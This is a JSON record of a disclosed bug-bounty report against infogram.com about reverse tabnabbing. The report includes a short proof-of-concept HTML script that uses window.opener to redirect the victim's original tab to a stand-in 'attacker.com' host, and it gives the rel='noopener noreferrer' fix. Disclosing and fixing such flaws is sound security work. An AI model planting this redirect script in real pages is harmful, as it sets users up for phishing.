@@ -1,0 +1,126 @@
+{
+  "id": 280500,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8yODA1MDA=",
+  "url": "https://hackerone.com/reports/280500",
+  "title": "Tabnabbing via window.opener",
+  "state": "Closed",
+  "substate": "resolved",
+  "severity_rating": "low",
+  "readable_substate": "Resolved",
+  "created_at": "2017-10-19T13:35:13.660Z",
+  "submitted_at": "2017-10-19T13:35:13.660Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "mr_r3boot",
+    "url": "/mr_r3boot",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/172/712/da5b2de96cb6ad1bc8fba57f45205e6592514185_original.jpg/3cb67cc78dc0cba55b102dd9eca2ee89b206d3e960be830f070583d9070b69ef"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": true,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 21745,
+    "url": "https://hackerone.com/infogram",
+    "handle": "infogram",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/021/745/553edf21f45ba8f73faba5d308e0d91fc026fef0_original.png/235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/021/745/553edf21f45ba8f73faba5d308e0d91fc026fef0_original.png/3f1ab5c6a9b6dadada1e6c8121700b884388bd0a43471fee1897a38ce57d0b2c"
+    },
+    "permissions": [],
+    "submission_state": "paused",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": false,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "pentest_retesting_ends_at": null,
+    "profile": {
+      "name": "Infogram",
+      "twitter_handle": "infogram",
+      "website": "http://infogram.com",
+      "about": "Make Infographics and Charts that People Love"
+    }
+  },
+  "has_bounty?": false,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "submitted_with_assistant": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [],
+  "singular_disclosure_disabled": false,
+  "disclosed_at": "2017-11-06T09:04:32.241Z",
+  "bug_reporter_agreed_on_going_public_at": "2017-11-03T14:55:28.831Z",
+  "team_member_agreed_on_going_public_at": "2017-11-06T09:04:32.104Z",
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "Hi Team, i would like to report tab nabbing issue on your domain.\n\n#Details:\n\nWhen you open a link in a new tab ( target=\"_blank\" ), the page that opens in a new tab can access the initial tab and change it's location using the window.opener property.\n\n#PoC:\n\n1.Navigate to ```https://infogram.com/app/[userproject]```.\n2. Provide any url as evil url. http://test.com/test.html test.html contains following code.\n\n```\n<html>\n<script>\nif (window.opener) window.opener.parent.location.replace('http://attacker.com');\nif (window.parent != window) window.parent.location.replace('http://attacker.com');\n</script>\nblah\n</html>\n```\nAlso check Open link in new tab\n\nThe javascript code that does all the magic: \n```window.opener.location.replace(newURL);```\nmy link will open in new tab and original tab will be replaced with attacker malicious link.\n\n#Fix:\n\nIn order to mitigate this issue, developers are encouraged to use rel=\"nofollow noopener noreferrer\" as follows:\n\n```\n<a target=\"_blank\" class=\"btn external-url\" href=\"https://evil.com\" rel=\"nofollow noopener noreferrer\"><i class=\"fa fa-external-link\"></i>\n</a>\n```\n\nLet me know if u have problems in reproducing the issue.\n\nRegards,\nMr.R3boot.",
+  "weakness": {
+    "id": 57,
+    "name": "Violation of Secure Design Principles"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [
+    {
+      "id": 230784,
+      "file_name": "TabNabbing.mp4",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/230/784/e4a9fe17cc1325f0cef6b541d91c3318eb1d85a5/TabNabbing.mp4?response-content-disposition=attachment%3B%20filename%3D%22TabNabbing.mp4%22%3B%20filename%2A%3DUTF-8%27%27TabNabbing.mp4&response-content-type=video%2Fmp4&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ4NBYFOQ4%2F20250921%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20250921T194426Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJH%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQDUOkW2FzFC6pm%2FNX1XaXFOMoMH%2Bp4H2WUiPJZqY%2BanwgIhAJFQ%2FlQr6I%2B0XtQDeMC2oBzuFsDrw8mLPnzuXsmpbd1PKrIFCBoQAxoMMDEzNjE5Mjc0ODQ5Igyr7Rw5YRF0HZ7fR%2FYqjwW5Qd1a9sJiEkY%2B%2F3zgLJW1Urm240ouIXC%2Fgaxrdjh7p08XzP5hiWBzZJbdK8F0ucj7xdDtBM%2FwJEuTALPEVPodKNXLuo2iPiEfHLn6Mi044F%2B1kIUP0JUBECpklZXKfr1UYZwdUZr01mZv3kz%2FI3%2Fqn1w0AiWtbTG08ENHN%2BgPlNoi7FWCS6Su3fwHpMyve8Ws3n2ItTFL8KJU%2BDuMyVs7WA3fUYoB5SyTJtEeuJyq7xUt%2FIEq46i9%2B3R%2FZuXRS9MXDvEwJSenc7BovdJbkmrfHrNXldVgLVXfRDoI7rfzQg9kpiyZL%2FNtqP0eLFtwnOssULBgqtvcj8gS6xZol0yOSvzTatcqbdFaUBjUyLwnCyvalzYWpBG8iJ0hIsnKdVxgyOfm3eG%2FyMp0l2ze37ns7D2G42ReaM27z6o9MLu2%2FaXchNsGsACQUmyJzmQeaWkLKsN3t0CV1a4ikXVBJoKuSvE1Ow1COmF4Ga2gQGRvxhSKkmd%2BwqpMtiudIH2qoRrFAy9vYiLw3rNmj6PmurdKVSc5IQ9UNxuMF3Oody6yS5NDAZXXQXaG4wJ%2BdokigS90AYqlv9ISgI3CuNe08R9v67hxFBTRFYlkffzzWXjA55E3n%2FfB%2FfsKdvyOHus%2F4b%2B5ykH2GacB7nF7oaycS%2FIwvab5cWW5NKoEsiYhqg1qFqW%2F767vijcT54G9RDk99KaoL7RvH0XjSJZLGBH3ysF1apVxsziRJxMaqOdC92Psjzq17fzztkjL8IRjSu%2FmDkVRJoSg65hwJO7nyBDpZLnqoU4SyQXKhceVVzzVxrAvs1ULMjCrCNy8LLJuVpp4aVfgQBSuPISCgGpnNgRyRUBAEOg1IWUPYdUw49OAMQllMLXPwMYGOrABAWXJLzknPNalVhXK%2BCD1xQTo7%2FG%2F8w2hhdtgVQygVnyY5d%2BT9T7ud5%2BbdHuudRmYgmMmSjNEMp22ujihBkD%2Bff5FvQTNjj6uaoBxOVIT0HovM5Q%2FMD8whEgbTG5c7Z1wEG2nZEC1OV%2FfqWEtb5RMBmE5z0FRma6AYAY7IShPFPHfGzVOzU%2BB7oLUVCqVPJZZlTdn%2FX1dBFkKtdV4f1XLR%2BgKj30YXP3LHhQ1daucH9g%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=f02172729601239fff739fa73b46ff1d8867b21ecb1d204e2a6b774c11f3b0f1",
+      "file_size": 1222323,
+      "type": "video/mp4",
+      "moderated": null
+    }
+  ],
+  "allow_singular_disclosure_at": "2017-12-03T14:55:28.929Z",
+  "allow_singular_disclosure_after": -246170937.32024598,
+  "singular_disclosure_allowed": true,
+  "vote_count": 6,
+  "voters": [
+    "eveeez",
+    "khizer47",
+    "mr_r3boot",
+    "klau5",
+    "minihacker01",
+    "b4155f7c29acd42c27d007a"
+  ],
+  "severity": {
+    "rating": "low",
+    "author_type": "User"
+  },
+  "structured_scope": {
+    "databaseId": 870,
+    "asset_type": "URL",
+    "asset_identifier": "infogram.com",
+    "max_severity": "critical"
+  },
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
